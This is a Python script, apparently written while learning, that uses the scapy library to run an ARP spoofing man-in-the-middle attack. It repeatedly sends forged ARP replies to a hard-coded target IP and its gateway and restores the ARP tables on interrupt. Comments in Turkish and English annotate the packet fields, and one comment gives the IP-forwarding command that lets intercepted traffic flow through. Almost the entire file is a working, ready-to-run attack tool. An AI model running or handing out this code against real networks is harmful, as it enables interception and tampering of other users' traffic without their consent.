#!/usr/bin/env python
# coding=utf-8
import scapy.all as scapy
import time
import sys


def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arpRequestBroadcast = broadcast/arpRequest

    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    try:
        return answeredList[0][1].hwsrc
    except IndexError:
        print("")


def spoof(targetIp, spoofIp):
    targetMac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
    scapy.send(packet, verbose=False)


def restore(destinationIp, sourceIp):
    destinationMac = getMac(destinationIp)
    sourceMac = getMac(sourceIp)
    packet = scapy.ARP(op=2, pdst=destinationIp, hwdst=destinationMac, psrc=sourceIp, hwsrc=sourceMac) #(op=2 -> this means a response not a request
    scapy.send(packet, count=6, verbose=False) # count yani 6 kere yolla


sendPacketCount = 0
targetIp = "10.30.161.177"
gatewayIp = "10.30.161.1"

try:

    while True:
        spoof(gatewayIp, targetIp)
        spoof(targetIp, gatewayIp)
        sendPacketCount += 2
        print("\r[+] Packet sent: " + str(sendPacketCount)),
        # python 2.7 de eğer print ifadelerinin aynı satırda yazılmasını istiyosan virgül koyuyorsun python3 için ise print içine vilgül koy ve end="" diyosun
        # eğer ifadeyi her seferinde başa yazmak istiyorsan \r koyuyorsun.
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL-C... Resetting ARP tables...")
    restore(gatewayIp, targetIp)
    restore(targetIp, gatewayIp)

# We need this : echo 1 > /proc/sys/net/ipv4/ip_forward

# these are answeredlist[0] and [1]
# bunların iclerinde de farkettiysen virgülle ayrılmış iki liste var sağdakini yani 1.sini seciyoruz.Oradakinde de hwsrc seçiyoruz.
# (<Ether  dst=ff:ff:ff:ff:ff:ff type=0x806 |<ARP  pdst=192.168.1.107 |>>, <Ether  dst=ac:2b:6e:3f:c6:45 src=84:89:ad:a8:96:14 type=0x806 |<ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=84:89:ad:a8:96:14 psrc=192.168.1.107 hwdst=ac:2b:6e:3f:c6:45 pdst=192.168.1.103 |>>)
# --------------------
# (<Ether  dst=ff:ff:ff:ff:ff:ff type=0x806 |<ARP  pdst=192.168.1.1 |>>, <Ether  dst=ac:2b:6e:3f:c6:45 src=ec:08:6b:f0:1c:4b type=0x806 |<ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=ec:08:6b:f0:1c:4b psrc=192.168.1.1 hwdst=ac:2b:6e:3f:c6:45 pdst=192.168.1.103 |>>)


# packet.show()
# packet.summary()
# scapy.ls(scapy.ARP())
# hwtype     : XShortField                         = 1               (1)
# ptype      : XShortEnumField                     = 2048            (2048)
# hwlen      : FieldLenField                       = None            (None)
# plen       : FieldLenField                       = None            (None)
# op         : ShortEnumField                      = 1               (1)    -->> if it's 1, it's a request. We need answer packet and it should be 2
# hwsrc      : MultipleTypeField                   = 'ac:2b:6e:3f:c6:45' (None)
# psrc       : MultipleTypeField                   = '192.168.1.103' (None) -->> what do you want to set the packet's source ip
# hwdst      : MultipleTypeField                   = None            (None) -->> where are you going to send this packet (mac)
# pdst       : MultipleTypeField                   = None            (None) -->> where are you going to send this packet (ip)

